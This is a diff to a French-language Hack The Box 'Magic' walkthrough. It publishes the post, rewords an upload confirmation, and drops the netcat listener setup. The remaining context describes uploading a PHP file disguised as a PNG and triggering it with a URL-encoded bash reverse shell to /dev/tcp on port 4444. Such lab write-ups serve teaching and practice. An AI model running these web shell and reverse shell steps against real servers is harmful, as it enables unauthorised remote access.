@@ -7,9 +7,9 @@
 title: "Magic — HTB Medium Writeup & Walkthrough"
 linkTitle: "Magic"
 slug: "magic"
-date: 2026-06-15T10:06:17+02:00
+date: 2026-08-10T11:15:00+02:00
 #lastmod: 2026-06-15T10:06:17+02:00
-draft: true
+draft: false
 
 # --- PaperMod / navigation ---
 type: "writeups"
@@ -635,9 +635,9 @@ debian-logo.php.png: PNG image data, 48 x 48, 8-bit/color RGBA, non-interlaced
 
 Tu peux maintenant retenter l’upload de ce nouveau fichier `debian-logo.php.png`.
 
-Un message affiché en haut à gauche confirme que l’upload a réussi.
+Un message affiché en haut à gauche confirme la réussite de l’upload.
 
-<img src="magic-debian-logo-php-png-uploaded.png" alt="Message de refus lors de l’upload du fichier debian-logo.php.png sur Magic" class="img-left-60">
+<img src="magic-debian-logo-php-png-uploaded.png" alt="Confirmation de l’upload du fichier debian-logo.php.png sur Magic" class="img-left-60">
 
 L’étape suivante consiste à appeler le fichier uploadé dans `/images/uploads/` avec le paramètre `cmd`, afin de vérifier si le code PHP ajouté est bien interprété par le serveur.
 
@@ -722,22 +722,8 @@ et connecte-le vers Kali sur le port 4444
 
 Comme cette commande doit être envoyée dans une URL, certains caractères spéciaux doivent être encodés. Dans le navigateur, l’URL appelée ressemble à ceci :
 
-```text
+```url
 http://magic.htb/images/uploads/debian-logo.php.png?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.x.x/4444%200%3E%261%27
-```
-
-Sur Kali, tu commences par ouvrir un port en écoute. 
-
-Tu pourrais utiliser simplement `nc` :
-
-```bash
-nc -lvnp 4444
-```
-
-Pour plus de confort, tu peux aussi utiliser `rlwrap` au lieu de `nc` :
-
-```bash
-rlwrap -cAr nc -lvnp 4444
 ```
 
 Une fois l’URL appelée, une connexion arrive sur le listener ouvert sur Kali.
